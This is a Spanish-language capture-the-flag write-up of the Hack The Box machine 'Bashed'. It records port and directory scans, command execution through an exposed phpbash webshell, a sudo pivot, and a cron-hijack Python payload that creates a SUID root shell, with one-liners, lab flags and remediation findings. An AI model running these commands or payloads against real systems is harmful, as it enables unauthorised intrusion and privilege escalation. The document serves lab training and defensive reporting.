# REPORTE DETALLADO DE EXPLOTACIÓN - MÁQUINA BASHED (Hack The Box)

## Resumen Ejecutivo

| Campo | Valor |
|-------|-------|
| **Objetivo** | Bashed (10.129.79.102) |
| **SO / Stack** | Ubuntu 16.04.2 LTS, kernel 4.4.0-62-generic (x86_64), Apache httpd 2.4.18 |
| **Vulnerabilidad Inicial** | Webshell `phpbash.php` pública en `/dev/` (listado de directorio abierto) |
| **Usuario obtenido** | `www-data` → `scriptmanager` (sudo NOPASSWD) |
| **Escalada** | Escritura de `/scripts/test.py` (ejecutado por root vía cron) → SUID bash |
| **Privilegio Obtenido** | **ROOT (euid=0)** |
| **Flags Obtenidas** | user.txt ✅ root.txt ✅ |
| **Credenciales** | Ninguna crackeada/creada — acceso por webshell pública + sudo |

**Flags:**

| Flag | Valor | Archivo |
|------|-------|---------|
| USER | `5f8f84e379601f306b60208251e19a41` | `/home/arrexel/user.txt` (444) |
| ROOT | `9a34a2dea90c3c1598e5acd3c61584cb` | `/root/root.txt` (600) |

---

## Fase 1: Reconocimiento

```bash
$ mkdir -p /home/kali/HTB/bashed
$ nmap -sCV -p- -T4 -oA /home/kali/HTB/bashed/nmap 10.129.79.102   # 163 s
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

**Solo 80/tcp** (65534 puertos cerrados/reset). Sin SSH u otros servicios.

```bash
$ curl -sI http://10.129.79.102/
HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Mon, 04 Dec 2017 23:03:42 GMT
Content-Length: 7743
```

Página principal: `<title>Arrexel's Development Site</title>` (plantilla SUPPABLOG de Colorlib, HTML estático).

---

## Fase 2: Enumeración web

Sondeo manual de rutas típicas (`probe_paths.txt`):

```
404  /robots.txt   404  /.git/HEAD   404  /.env   404  /phpinfo.php
403  /.htaccess    200  /uploads/    200  /php/   404  /html/ /backup/ /admin/
```

Feroxbuster (wordlists: `/usr/share/feroxbuster/raft-medium-directories.txt` — en esta Kali no existen dirb/common.txt ni SecLists):

```bash
$ feroxbuster -u http://10.129.79.102 -w /usr/share/feroxbuster/raft-medium-directories.txt -t 40 -o ferox_dirs.txt -r
```

Hits relevantes:

```
200  /dev/                        <-- listado de directorio ABIERTO
200  /dev/phpbash.php    (8151c)  <-- WEBSHELL
200  /dev/phpbash.min.php (4559c)
200  /php/ → /php/sendMail.php (0c)
200  /uploads/ (14c)   200 /css/ /js/ /images/ /fonts/
403  /server-status
```

Listado de `/dev/`:

```
Index of /dev
  phpbash.min.php   2017-12-04 12:21  4.6K
  phpbash.php       2017-11-30 23:56  8.1K
```

Otros: `/php/sendMail.php` y `config.php` → 200 pero **0 bytes**; backups (`config.php.bak`, `index.html~`, `.git/config`) → 404; verbos `Allow: GET,HEAD,POST,OPTIONS`; `/server-status` → 403.

---

## Fase 3: Explotación inicial — RCE vía webshell preexistente

Descarga y análisis de la shell (interfaz JS en el cliente):

```bash
$ curl -s http://10.129.79.102/dev/phpbash.php -o phpbash.php
$ grep -n "request.send" phpbash.php
   request.send("cmd=whoami; hostname; pwd");    # POST cmd=<comando>
```

Prueba de RCE:

```bash
$ curl -s -X POST -d "cmd=whoami; hostname; pwd; id" http://10.129.79.102/dev/phpbash.php
www-data
bashed
/var/www/html/dev
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Helper creado para todo el ataque:

```bash
#!/bin/bash
# wshell.sh "<comando>"
curl -s -X POST --data-urlencode "cmd=$1" http://10.129.79.102/dev/phpbash.php
```

**Hallazgo [CRÍTICO]:** webshell **phpbash** (HexaD) desplegada en `/dev/` — ejecución de comandos sin autenticación como `www-data`.

---

## Fase 4: Enumeración local + user flag

```bash
$ ./wshell.sh "sudo -l"
User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL          <-- pivote

$ ./wshell.sh "ls -la /home/*"
/home/arrexel:
-r--r--r-- 1 arrexel arrexel  33 Oct  1 10:52 user.txt    <-- legible por todos
/home/scriptmanager: (solo configs)

$ ./wshell.sh "cat /home/arrexel/user.txt"
5f8f84e379601f306b60208251e19a41                           <-- FLAG USER
```

Otros datos de enumeración:

```
uname -a    -> Linux bashed 4.4.0-62-generic ... x86_64 GNU/Linux
/etc/issue  -> Ubuntu 16.04.2 LTS
/opt        -> vacío
SUID        -> solo estándar (mount, su, sudo, passwd, ntfs-3g, ping...) — sin binarios raros
/var/www/html          -> drw-r-xr-x (sin x para owner)
/var/www/html/uploads  -> 777 (pero no hay endpoint de subida)
crontabs del sistema   -> solo los típicos de Ubuntu
find / -name root.txt  -> no visible desde www-data (/root en 700)
```

---

## Fase 5: Enumeración como `scriptmanager`

```bash
$ ./wshell.sh "sudo -u scriptmanager id"
uid=1001(scriptmanager) gid=1001(scriptmanager) groups=1001(scriptmanager)

$ ./wshell.sh "sudo -u scriptmanager find / -user scriptmanager"
/scripts
/scripts/test.py
/home/scriptmanager/...

$ ./wshell.sh "ls -la /scripts"                # como www-data: d????????? (sin x para otros)
$ ./wshell.sh "sudo -u scriptmanager ls -la /scripts"
drwxrwxr--  2 scriptmanager scriptmanager 4096  .
-rw-r--r--  1 scriptmanager scriptmanager   58  test.py      <-- WRITABLE
-rw-r--r--  1 root          root            12  test.txt     <-- mtime cada minuto

$ ./wshell.sh "sudo -u scriptmanager cat /scripts/test.py"
f = open("test.txt", "w")
f.write("testing 123!")
f.close

$ ./wshell.sh "ls -la /var/spool/cron/crontabs/"
-????????? root   (crontab de root existe, ilegible)
```

**Hallazgo [ALTO]:** `test.py` es de `scriptmanager` y **writable**; `test.txt` lo posee **root** y se regenera cada minuto ⇒ **root ejecuta `/scripts/test.py` periódicamente por cron**. Verificación de escritura: `echo "# writable-test" >> /scripts/test.py` → `WRITE_OK`.

---

## Fase 6: Escalada a root

Payload (enviado en base64 para evitar problemas de quoting):

```python
import os
os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")
os.system("cat /root/root.txt > /tmp/rootflag && chmod 666 /tmp/rootflag")
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

Despliegue desde la webshell:

```bash
echo '<b64>' | base64 -d | sudo -u scriptmanager tee /scripts/test.py
# verificación: content correcto, date -> Thu Oct 1 10:57:53 PDT 2026
```

Espera de 75 s al cron:

```
-rwsr-xr-x 1 root root 1037528 Oct  1 10:59 /tmp/rootbash
-rw-rw-rw- 1 root root      33 Oct  1 10:59 /tmp/rootflag
$ cat /tmp/rootflag
9a34a2dea90c3c1598e5acd3c61584cb          <-- FLAG ROOT
```

Verificación con shell SUID:

```bash
$ /tmp/rootbash -p -c 'id; hostname; cat /root/root.txt; ls -la /root'
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bashed
9a34a2dea90c3c1598e5acd3c61584cb
-r-------- 1 root root 33 Oct  1 10:52 /root/root.txt
```

---

## Fase 7: Vectores fallidos / descartados

| Intento | Resultado |
|---|---|
| `robots.txt`, `sitemap.xml`, `.git/HEAD`, `.env`, `phpinfo.php` | 404 |
| Backups `config.php.bak/~/.old/.save`, `index.html.bak`, `.DS_Store` | 404 |
| `uploads/shell.php`, `dev/shell.php`, `phpbash.php.bak` | 404 — no hay endpoint de subida exploitable |
| `/php/sendMail.php` y `/config.php` | 200 pero **0 bytes** (sin vulnerabilidad) |
| `sudo -n true` a root desde www-data | solo permite `scriptmanager`, no root |
| Binarios SUID no estándares / dirtycow / kernel exploits | ninguno (4.4.0-62, innecesario) |
| `cat /root/root.txt` desde www-data o scriptmanager | `Permission denied` (`/root` 700) |
| `cat /home/scriptmanager/.bash_history` | `Permission denied` (600) |
| `grep -i cron /var/log/syslog` | `Permission denied` (640 root:adm) → cron deducido por evidencia (`test.txt` con mtime vivo) |
| Reverse shell / listener `nc` | no hizo falta: la webshell daba ejecución directa (evitó dejar procesos) |
| `rm -f /tmp/rootbash` como www-data | falló (sticky + owner root) → borrado con `/tmp/rootbash -p -c 'rm -f ...'` |

---

## Fase 8: Limpieza y verificación final

- `/scripts/test.py` restaurado al original (**58 bytes**, `md5 a987f7673f65f67bfd9f5912bfed0955`).
- `/tmp/rootbash` y `/tmp/rootflag` eliminados; re-verificado a los 70 s: `No such file or directory`.
- Flag user re-leída OK.
- **Kali limpio:** 0 procesos (nmap/ferox/nc) y 0 listeners (`ss -lntp` vacío). 46 ficheros de evidencia en `/home/kali/HTB/bashed/`.

---

## Comandos clave (one-liner del ataque)

```bash
nmap -sCV -p- -T4 -oA nmap 10.129.79.102
feroxbuster -u http://10.129.79.102 -w /usr/share/feroxbuster/raft-medium-directories.txt -o ferox_dirs.txt -r
curl -s -X POST --data-urlencode "cmd=id; sudo -l" http://10.129.79.102/dev/phpbash.php
curl -s -X POST --data-urlencode "cmd=cat /home/arrexel/user.txt" http://10.129.79.102/dev/phpbash.php
echo '<b64>' | base64 -d | sudo -u scriptmanager tee /scripts/test.py   # desde la webshell
sleep 75 && curl -s -X POST --data-urlencode "cmd=cat /tmp/rootflag" http://10.129.79.102/dev/phpbash.php
/tmp/rootbash -p -c 'id; cat /root/root.txt'
```

---

## MITRE ATT&CK Mapping

| Táctica | Técnica | ID |
|---------|---------|-----|
| Reconocimiento | Active Scanning: port scan | T1046 |
| Reconocimiento | Gather Victim Host Information: Software | T1592.004 |
| Acceso Initial | Exploitation of Remote Services | T1210 |
| Acceso Initial | Server Software Component: Web Shell | T1505.003 |
| Ejecución | Command and Scripting Interpreter: PHP | T1059.006 |
| Escalada | Abuse Elevation Control Mechanism: Sudo | T1548.003 |
| Escalada | Scheduled Task/Job: Cron (script de terceros) | T1053.003 |
| Escalada | Hijack Execution Control Flow: Setuid Binary | T1548.016 |
| Acceso a datos | Data from Local System | T1005 |

---

## Hallazgos y Remediación

| # | Hallazgo | Severidad | Evidencia | Remediación |
|---|----------|-----------|-----------|-------------|
| 1 | Webshell `phpbash.php` pública en `/dev/` (listado abierto) | **CRÍTICO** | `POST cmd=` → `www-data` sin auth | Eliminar la shell, deshabilitar listados de directorio, revisar accesos |
| 2 | `www-data` con `NOPASSWD: ALL` como `scriptmanager` (sudoers) | **ALTO** | `sudo -l` | Eliminar la regla sudo; principio de mínimo privilegio |
| 3 | `/scripts/test.py` ejecutado por root vía cron y writable por scriptmanager | **CRÍTICO** | `test.txt` root con mtime vivo; payload → SUID bash | Root no debe ejecutar scripts de usuarios; ficheros root-owned y no escribibles |
| 4 | `/var/www/html/uploads` en 777 (sin endpoint explotable aún) | **MEDIO** | `ls -la` | Permisos mínimos, deshabilitar si no se usa |
| 5 | Ubuntu 16.04 / kernel 4.4.0-62 / Apache 2.4.18 obsoletos | **MEDIO** | nmap, uname | Actualizar SO |
| 6 | `/root` 700 y root.txt 600 correctos; user.txt 444 (legible por diseño HTB) | INFO | ls -la | — |

---

## Éxito del Ataque

| Objetivo | Estado |
|----------|--------|
| Acceso al sistema | Completado (`www-data` vía webshell pública) |
| Privilegio Root | Obtenido (euid=0 vía cron + SUID) |
| user.txt | `5f8f84e379601f306b60208251e19a41` |
| root.txt | `9a34a2dea90c3c1598e5acd3c61584cb` |
| Limpieza | Completada (test.py restaurado, SUID/tmp borrados, sin listeners) |

---

## Archivos del caso

| Archivo | Contenido |
|---------|-----------|
| `/home/kali/HTB/informes/informe_bashed.md` | Este informe |
| `/home/kali/HTB/bashed/bashed_flags.txt` | Flags + credenciales + cadena + MITRE + limpieza |
| `/home/kali/HTB/bashed/nmap.{nmap,gnmap,xml}` | Escaneo `nmap -sCV -p- -T4` |
| `/home/kali/HTB/bashed/ferox_dirs.txt` | Resultados de feroxbuster |
| `/home/kali/HTB/bashed/wshell.sh` | Helper de la webshell (POST `cmd=`) |
| `/home/kali/HTB/bashed/phpbash.php` | Webshell descargada y analizada |
| `/home/kali/HTB/bashed/root_shell_proof.txt`, `payload_*.txt`, `root_check1.txt` | Evidencia de la escalada |
